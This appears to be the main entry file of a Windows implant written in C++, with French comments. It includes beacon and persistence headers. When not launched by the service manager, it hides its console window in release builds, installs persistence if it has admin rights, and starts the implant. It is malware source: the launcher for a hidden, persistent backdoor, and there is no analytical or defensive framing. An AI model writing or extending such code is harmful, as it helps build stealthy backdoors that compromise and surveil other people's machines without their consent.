#include "beacon.h"
#include "persistence.h"
#include "service.h"
#include "log.h"
#include <windows.h>
#include <string>

int main(int argc, char** argv) {
    // 1. Tenter de se connecter au SCM
    int res = run_as_service();
    if (res == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        // 2. Si on n'est pas lancé par le SCM, on est en mode console !
#ifdef NDEBUG
        ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif
        // On tente d'installer la persistance (si admin)
        install_persistence();

        // Puis on tourne directement en console
        start_implant();
        return 0;
    }
    return res;
}